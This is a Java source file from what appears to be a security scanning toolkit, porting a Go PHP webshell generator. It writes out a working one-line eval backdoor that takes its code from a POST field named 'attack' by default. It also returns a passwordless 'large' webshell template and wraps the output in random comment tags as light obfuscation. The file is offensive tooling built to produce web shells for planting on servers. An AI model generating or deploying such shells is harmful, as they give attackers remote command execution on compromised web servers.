package space.jyscan.modules.webshell;

import space.jyscan.core.util.Fmt;
import space.jyscan.core.util.RandUtil;

/**
 * PHP WebShell生成器，移植自 freeclient/internal/webshell/php.go。
 *
 * <p>命令行侧强制 {@code EncodeType="none"}、{@code ObfuscateLevel=0}、{@code NoPassword=true}
 * （见 cli/webshell.go 的 runWebShellGenerator），因此只移植该强制选项集下可达的分支：
 * <ul>
 *   <li>{@link #generateSmallPHPWebShell} —— 无编码小马（type=small）；</li>
 *   <li>{@link #generateNoPasswordLargePHPWebShell} —— 无密码大马
 *       （type=large 时 Go 实际执行的生成器，因为 NoPassword 恒为 true）；</li>
 *   <li>{@link #obfuscatePHP} —— level&lt;=0 时原样返回（小马路径会调用）。</li>
 * </ul>
 *
 * <p><b>未移植的不可达分支</b>（强制选项集下永远走不到，调用到会抛
 * {@link WebShellException} 而不是静默返回错误内容）：
 * base64/hex 编码分支、encodeToHex、带密码大马 generateLargePHPWebShell。
 */
public final class PhpWebShell {

    private PhpWebShell() {
    }

    /**
     * 生成PHP WebShell（Go: GeneratePHPWebShell）。
     *
     * @throws WebShellException 失败时抛出，message 与 Go 的 fmt.Errorf 文本一致
     */
    public static String generatePHPWebShell(PHPOptions options) {
        // 如果选择无密码大马，则不需要密码检查
        if (!options.noPassword && (options.password == null || options.password.isEmpty())) {
            throw new WebShellException("密码不能为空");
        }

        if (options.type == null || options.type.isEmpty()) {
            options.type = "small";
        }

        if (options.encodeType == null || options.encodeType.isEmpty()) {
            options.encodeType = "base64";
        }

        if (options.obfuscateLevel < 0) {
            options.obfuscateLevel = 0;
        } else if (options.obfuscateLevel > 3) {
            options.obfuscateLevel = 3;
        }

        switch (options.type.toLowerCase()) {
            case "small":
                return generateSmallPHPWebShell(options);
            case "large":
                if (options.noPassword) {
                    return generateNoPasswordLargePHPWebShell(options);
                }
                // Go: return generateLargePHPWebShell(options), nil
                // 强制 NoPassword=true 下不可达，generateLargePHPWebShell 未移植
                throw new WebShellException(
                        "未移植：带密码大马 generateLargePHPWebShell（仅 NoPassword=false 时可达，强制选项集下不可达）");
            default:
                throw new WebShellException(Fmt.format("不支持的WebShell类型: %s", options.type));
        }
    }

    /**
     * 生成PHP小马（Go: generateSmallPHPWebShell）。
     */
    static String generateSmallPHPWebShell(PHPOptions options) {
        // 生成简洁的PHP小马：<?php @eval($_POST['attack']);?>
        // 使用-pw参数指定密码字段
        String passwordField = options.password;
        if (passwordField == null || passwordField.isEmpty()) {
            passwordField = "attack"; // 默认使用"attack"作为密码字段
        }

        String smallShell = Fmt.format("<?php @eval($_POST['%s']);?>", passwordField);

        // 应用编码：强制 EncodeType="none"，只移植 default 分支
        // （无编码时保持简洁格式，不做任何改变；base64/hex 分支不可达，未移植）
        switch (options.encodeType.toLowerCase()) {
            case "base64", "hex":
                throw new WebShellException(
                        "未移植的编码类型: " + options.encodeType + "（强制 EncodeType=none 下不可达）");
            default:
                break;
        }

        // 对混淆级别进行限制，确保基本功能正常
        int safeLevel = options.obfuscateLevel;
        if (safeLevel > 1) {
            safeLevel = 1; // 最高使用级别1的混淆，避免过于复杂导致问题
        }

        return obfuscatePHP(smallShell, safeLevel);
    }

    /**
     * 生成无密码PHP大马（Go: generateNoPasswordLargePHPWebShell）。
     * type=large 且 NoPassword=true 时实际执行的生成器。
     */
    static String generateNoPasswordLargePHPWebShell(PHPOptions options) {
        // 读取无密码大马文件内容（对应 go 反引号原始字符串）
        String noPasswordShell = PhpTemplates.NO_PASSWORD_LARGE;

        // 如果用户提供了密码，则替换默认的cmd参数
        if (options.password != null && !options.password.isEmpty()) {
            // 替换默认的cmd参数为用户设置的密码（等价 strings.Replace(..., "cmd", password, -1)）
            noPasswordShell = noPasswordShell.replace("cmd", options.password);
        }

        // 对于大马，如果用户选择不编码，则直接返回原始代码（大马不需要编码，也跳过混淆）
        if ("none".equals(options.encodeType.toLowerCase())) {
            return noPasswordShell;
        }

        // base64/hex 编码分支与 obfuscatePHP 调用：强制 EncodeType="none" 下不可达，未移植
        throw new WebShellException(
                "未移植的编码类型: " + options.encodeType + "（强制 EncodeType=none 下不可达）");
    }

    /**
     * 混淆PHP代码，但避免过度混淆导致功能失效（Go: obfuscatePHP）。
     * 强制 ObfuscateLevel=0 时 level&lt;=0，直接原样返回。
     */
    static String obfuscatePHP(String code, int level) {
        // 限制混淆级别，确保功能正常
        if (level > 1) {
            level = 1; // 最高使用级别1混淆，避免破坏大马的图形界面
        }

        if (level <= 0) {
            return code;
        }

        // 级别1: 添加简单的随机注释
        String randStr = generateRandomString(6);
        // 避免重复添加PHP标签
        if (!code.startsWith("<?php")) {
            code = "<?php" + code;
        }
        if (!code.endsWith("?>")) {
            code = code + "?>";
        }
        // 添加混淆注释（等价 strings.Trim(code, "<?php?>")）
        return Fmt.format("<?php /* JYscan_%s */ %s /* End_%s */ ?>",
                randStr, trimCutset(code, "<?php?>"), randStr);
    }

    /**
     * 生成指定长度的随机字符串（Go: generateRandomString）。
     * php.go 使用 crypto/rand + 同一字符集取模，这里复用 RandUtil 的等价实现。
     */
    static String generateRandomString(int length) {
        return RandUtil.generateRandomStringWithCharset(length, RandUtil.LETTER_BYTES);
    }

    /** 等价 Go 的 strings.Trim(s, cutset)：从两端切除 cutset 中出现的字符。 */
    private static String trimCutset(String s, String cutset) {
        int start = 0;
        int end = s.length();
        while (start < end && cutset.indexOf(s.charAt(start)) >= 0) {
            start++;
        }
        while (end > start && cutset.indexOf(s.charAt(end - 1)) >= 0) {
            end--;
        }
        return s.substring(start, end);
    }
}
